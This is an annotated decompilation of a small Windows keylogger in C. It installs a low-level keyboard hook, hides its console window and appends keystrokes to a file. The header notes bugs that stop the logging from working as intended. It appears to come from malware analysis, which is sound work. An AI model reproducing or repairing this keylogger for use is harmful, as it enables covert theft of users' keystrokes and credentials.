/* Cleaned / annotated reconstruction of keylogger_hook
 * Source: Hex-Rays — artefacts/ida_export/keylogger_hook.c
 * WH_KEYBOARD_LL = 13; WM_KEYDOWN = 0x0100
 *
 * Caveats (student bugs visible in Hex-Rays):
 *  - hook callback treats lParam as char* and fputs() it; for LL hooks
 *    lParam is KBDLLHOOKSTRUCT* — incorrect, often crash/garbage
 *  - GetMessageW uses global lpMsg never allocated
 *  - log path under Program Files (x86) typically needs elevation
 */
#include <windows.h>
#include <stdio.h>

HHOOK g_hhk;
FILE *g_stream;

LRESULT CALLBACK fn(int code, WPARAM wParam, LPARAM lParam)
{
    g_stream = fopen("C:\\Program Files (x86)\\note.txt", "a+");
    if (wParam == WM_KEYDOWN) { /* 256 */
        fputs((const char *)lParam, g_stream); /* buggy cast */
        fclose(g_stream);
    }
    return CallNextHookEx(g_hhk, code, wParam, lParam);
}

int main(void)
{
    MSG msg;
    AllocConsole();
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), SW_HIDE);
    g_hhk = SetWindowsHookExW(WH_KEYBOARD_LL /*13*/, fn, NULL, 0);
    puts(g_hhk ? "All is good" : "Something went wrong :(");
    while (GetMessageW(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
    return 0;
}
